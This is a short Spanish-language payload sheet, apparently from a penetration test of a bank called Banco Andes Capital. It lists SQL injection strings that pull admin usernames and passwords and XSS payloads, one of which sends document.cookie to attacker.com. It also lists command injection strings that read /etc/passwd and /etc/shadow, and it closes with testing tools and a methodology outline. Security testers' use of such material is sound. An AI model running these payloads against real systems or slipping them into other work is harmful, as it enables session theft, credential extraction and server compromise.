# Prompts de Seguridad - Banco Andes Capital

## Prompts Utilizados en Pruebas

### SQL Injection

```sql
-- Payload básico
' OR '1'='1

-- Unión de tablas
' UNION SELECT username, password FROM admin --

-- Tiempo de espera
' AND SLEEP(5) --

-- Extracción de versión
' UNION SELECT VERSION(), USER() --
```

### Cross-Site Scripting (XSS)

```javascript
// Alert básico
<script>alert('XSS')</script>

// Robo de cookies
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>

// Event handler
<img src=x onerror="alert('XSS')">

// SVG injection
<svg onload="alert('XSS')">
```

### Command Injection

```bash
# Ejecución de comandos
; cat /etc/passwd
| whoami
& id

# Comandos encadenados
; ls -la / | grep flag

# Redirección de salida
; cat /etc/shadow > /tmp/output.txt
```

## Herramientas Utilizadas

- **Burp Suite:** Intercepción y manipulación de tráfico
- **OWASP ZAP:** Escaneo automático de vulnerabilidades
- **SQLMap:** Automatización de SQL Injection
- **XSSStrike:** Detección de XSS
- **Commix:** Detección de Command Injection

## Metodología

1. Reconocimiento del objetivo
2. Mapeo de superficies de ataque
3. Pruebas manuales y automáticas
4. Documentación de hallazgos
5. Verificación de remediación
